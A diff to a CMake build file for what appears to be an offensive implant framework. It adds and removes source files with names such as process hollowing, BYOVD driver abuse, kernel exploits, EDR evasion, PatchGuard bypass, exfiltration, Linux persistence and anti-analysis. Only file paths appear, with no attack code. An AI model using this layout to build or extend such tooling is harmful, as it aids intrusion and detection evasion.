@@ -80,6 +80,7 @@ set(RUNTIME_SOURCES
     windows/execution/hollow.c
     windows/execution/inmem.c
     windows/execution/byovd.c
+    windows/execution/btr.c
     windows/execution/driver_interact.c
     windows/exploitation/kernel_exploit.c
     exploitation/linux_kernel.c
@@ -252,6 +253,9 @@ set(RUNTIME_SOURCES
     linux/forensics/linux_forensics.c
     linux/forensics/cleanup.c
 
+    # Linux-side FFI bindings and cross-platform wrappers
+    linux/linux_utils.c
+
     # Forensic analysis pipeline (Kamimi)
     # TODO: forensics/* - not yet integrated. Integration path:
     #       1. Reorganize headers: move forensic_types.h, analysis.h, provenance.h to forensics/ root
@@ -313,6 +317,7 @@ if(UNIX OR NOT WIN32)
         windows/execution/hollow.c
         windows/execution/inmem.c
         windows/execution/byovd.c
+        windows/execution/btr.c
         windows/execution/driver_interact.c
         windows/exploitation/kernel_exploit.c
         exfil/exfil.c
@@ -331,7 +336,6 @@ if(UNIX OR NOT WIN32)
         windows/evasion/blindside.c
         windows/evasion/process_spoofing.c
         windows/threading/threadpool_windows.c
-        windows/audit/audit.c
         windows/exfil/enhanced_exfiltration.c
         windows/kernel/patchguard_peekaboo.c
         windows/security/byoud.c
@@ -340,6 +344,11 @@ if(UNIX OR NOT WIN32)
         byovd/driver_scoring.c
         byovd/byovd_manifest.c
         byovd/byovd_modular.c
+        sysinfo.c
+        exploitation/linux_kernel.c
+        network/network.c
+        linux/persistence.c
+        linux/anti_analysis/detection.c
     )
 elseif(WIN32)
     # Remove Linux-only sources on Windows
@@ -385,6 +394,7 @@ elseif(WIN32)
         linux/networking/network.c
         linux/forensics/linux_forensics.c
         linux/forensics/cleanup.c
+        linux/linux_utils.c
     )
 endif()
 
